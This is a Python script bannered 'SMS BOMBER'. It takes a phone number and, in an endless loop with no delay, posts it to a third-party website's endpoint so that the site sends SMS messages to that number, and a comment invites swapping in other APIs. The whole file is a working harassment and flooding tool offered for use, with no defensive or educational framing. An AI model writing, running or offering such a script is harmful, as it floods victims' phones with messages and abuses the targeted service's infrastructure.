import requests
from colorama import Fore
import os

os.system("clear")
print(Fore.RED + """
███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
███████╗██╔████╔██║███████╗    ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
╚════██║██║╚██╔╝██║╚════██║    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
███████║██║ ╚═╝ ██║███████║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚══════╝╚═╝     ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                                                   """)

url = "https://stc.ninisite.com/s/av/"    #you can paste your own APU url here.
number = input(Fore.GREEN+ "Enter your number ?")

while True:
    try:
        response = requests.post(url, data={"cellphone": number})
        if response.status_code == 200:
            print(Fore.BLUE + "[+]Message sent successfull.")
        else:
            print(Fore.RED + f"[-]Failed to send message! Status code: {response.status_code}")
    except Exception as e:
            print(Fore.RED + f"Error occurred: {e}")
